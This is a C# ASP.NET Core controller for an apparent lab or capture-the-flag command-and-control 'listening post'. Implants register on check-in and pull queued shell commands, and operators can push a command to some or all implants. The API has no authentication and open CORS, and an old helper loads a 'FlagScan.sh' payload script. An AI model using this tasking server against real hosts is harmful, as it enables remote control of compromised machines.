using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using ListeningPostApiServer.Extensions;
using ListeningPostApiServer.Interfaces;
using ListeningPostApiServer.Models;
using Microsoft.AspNetCore.Cors;
using Microsoft.AspNetCore.Hosting;
using Microsoft.AspNetCore.Mvc;

namespace ListeningPostApiServer.Controllers
{
    /// <inheritdoc />
    /// <summary>
    ///     The tasking controller provides a mechanism by which Agents can self register themselves with
    ///     the Listening Post and also retrieve assigned instructions. Implements the
    ///     <see
    ///         cref="T:Microsoft.AspNetCore.Mvc.ControllerBase" />
    /// </summary>
    /// <seealso cref="T:Microsoft.AspNetCore.Mvc.ControllerBase" />
    /// <remarks>This controller provides both agent access and UI access.</remarks>
    [Produces("application/json")]
    [Route("[controller]")]
    [EnableCors("AllowAll")]
    [ApiController]
    [ProducesErrorResponseType(typeof(NotFoundResult))]
    public class TaskingController : ControllerBase
    {
        #region Constructors

        /// <summary>
        ///     Initializes a new instance of the <see cref="TaskingController" /> class.
        /// </summary>
        /// <param name="taskRepository">        An interface or implementation of a Task Repository.</param>
        /// <param name="implantRepository">     An interface or implementation of the Agent Repository.</param>
        /// <param name="payloadFileRepository"> An interface or implementation of the Payload File Repository.</param>
        /// <param name="env">                   An interface to the hosting environment is required.</param>
        /// <remarks>
        ///     Interfaces or implementations of 2 Repositories and access to the hosting environment
        ///     configuration are required and are provided by dependency injection.
        /// </remarks>
        public TaskingController(IRepository<TaskBase> taskRepository, IRepository<Implant> implantRepository,
            IRepository<PayloadFile> payloadFileRepository, IWebHostEnvironment env)
        {
            _taskRepository = taskRepository;
            _implantRepository = implantRepository;
            _inputFileRepository = payloadFileRepository;
            _env = env;
        }

        #endregion Constructors

        #region Fields

        /// <summary>
        ///     Provides an interface to the hosting environment's configuration for use by controller methods.
        /// </summary>
        private readonly IWebHostEnvironment _env;

        /// <summary>
        ///     Provides an interface to the implant repository implementation to controller methods.
        /// </summary>
        private readonly IRepository<Implant> _implantRepository;

        /// <summary>
        ///     Provides an interface to the task repository implementation to controller methods.
        /// </summary>
        private readonly IRepository<TaskBase> _taskRepository;

        private readonly IRepository<PayloadFile> _inputFileRepository;

        #endregion Fields

        #region Methods

        /// <summary>
        ///     Gets the current task for the specified <see cref="Implant">implant.</see>
        /// </summary>
        //[HttpGet("/Tasking")]
        //[HttpGet("/Tasking/{id}")]
        [HttpGet("{id:int}")]
        public async Task<IActionResult> Get(int id)
        {
            this.Log($"Implant Checked In. Implant Id: {id}");

            var implant = await _implantRepository.GetAsync(id) ??
                          await RegisterImplantAsync(id);

            var task = implant.Tasks.FirstOrDefault(t => t.IsPickedUp == false);

            if (task == null)
                return Ok();

            task.IsPickedUp = true;
            return Ok(task);
        }

        // List
        /// <summary>
        ///     Lists all of the tasks associated with a particular agent, or all tasks if an id is not provided.
        /// </summary>
        /// <param name="id">The agent identifier.</param>
        /// <returns>Task&lt;IActionResult&gt;.</returns>
        [HttpGet("list/{id:int?}")]
        public async Task<IActionResult> ListTasks(int id)
        {
            if (id == 0) return Ok(await _taskRepository.GetAsync());

            var implant = await _implantRepository.GetAsync(id);
            if (implant == null) return NoContent();

            var results = implant.Tasks;

            return Ok(results);
        }

        // POST: tasking/
        /// <summary>
        ///     Assigns a new to ask to specific agents, or all agents if an id is not specified
        /// </summary>
        /// <param name="taskRequest">A task Request.</param>
        /// <returns>Task&lt;IActionResult&gt;.</returns>
        /// <remarks>
        ///     This controller is a bit unstable due to the specifications of this project
        ///     (behavior/responses are inconsistent between agent, UI, and Postman for example.).
        /// </remarks>
        [HttpPost]
        public async Task<IActionResult> Post([FromBody] TaskRequest taskRequest)
        {
            IList<TaskBase> newTasks = new List<TaskBase>();

            if (taskRequest.Task != null)
            {
                if (taskRequest.Ids != null && taskRequest.Ids.Count() > 0)
                {
                    foreach (var id in taskRequest.Ids)
                    {
                        var implant = await _implantRepository.GetAsync(id);

                        if (implant != null)
                            newTasks.Add(await AssignTaskAsync(implant, taskRequest.Task));
                    }

                    return Ok(newTasks.AsEnumerable());
                }

                foreach (var implant in await _implantRepository.GetAsync())
                    newTasks.Add(await AssignTaskAsync(implant, taskRequest.Task));

                return Ok(newTasks.AsEnumerable());
            }

            return BadRequest(new {message = "you need at least a task definition"});
        }

        /// <summary>
        /// </summary>
        /// <param name="taskBase"></param>
        /// <param name="id"></param>
        [HttpPut("{id}")]
        public async void Put([FromBody] TaskBase taskBase, string id)
        {
            await _taskRepository.EditAsync(taskBase);
        }

        /// <summary>
        ///     Helper method to assign a new task to an implant.
        /// </summary>
        /// <param name="implant">The implant.</param>
        /// <param name="task">   The task.</param>
        /// <returns>Task&lt;TaskBase&gt;.</returns>
        private async Task<TaskBase> AssignTaskAsync(Implant implant, TaskBase task)
        {
            var newTask = new TaskBase
            {
                Command = task.Command,
                Implant = implant,
                TaskType = TaskType.Command
            };

            await _taskRepository.AddAsync(newTask);

            return task;
        }

        /// <summary>
        ///     This method is no longer used, I left it here because it's complex. I used it to
        ///     bootstrap hard-coded files into the database on application start. (Though not really on
        ///     application start, I cheated and triggered it on every GET call to the Tasking controller.)
        /// </summary>
        /// <returns>A Task.</returns>
        [Obsolete]
        // ReSharper disable once UnusedMember.Local
        private async Task LoadFile()
        {
            const string fileName = "FlagScan.sh";
            var existingFile =
                (await _inputFileRepository.GetAsync()).FirstOrDefault(f => f.ActualFileName == fileName);

            if (existingFile != null)
            {
                this.Log($"File: {fileName} already exists in DB");
                return;
            }

            var localFilePath = Path.Join(_env.WebRootPath, "Scripts/", fileName);
            var newFileEntity = new PayloadFile
            {
                ActualFileName = fileName,
                TempFilePath = localFilePath
            };

            this.Log($"Attempting to register local file: {localFilePath} into DB as: {newFileEntity.Guid}");

            await _inputFileRepository.AddAsync(newFileEntity);
            this.Log("Success");
        }

        /// <summary>
        ///     This method handles registering an agent in the database if it doesn't previously exist.
        ///     Saves you from manually populating it.
        /// </summary>
        /// <param name="implantId">The implant identifier (int not Guid).</param>
        /// <returns>Task&lt;Implant&gt;.</returns>
        private async Task<Implant> RegisterImplantAsync(int implantId)
        {
            var implant = await _implantRepository.AddAsync(new Implant
            {
                Id = implantId
            });

            return implant;
        }

        #endregion Methods

        //private async Task<Implant> GetImplantAsync(int implantId)
        //{
        //    return await ((ImplantRepository)_implantRepository).GetById(implantId);
        //}
    }
}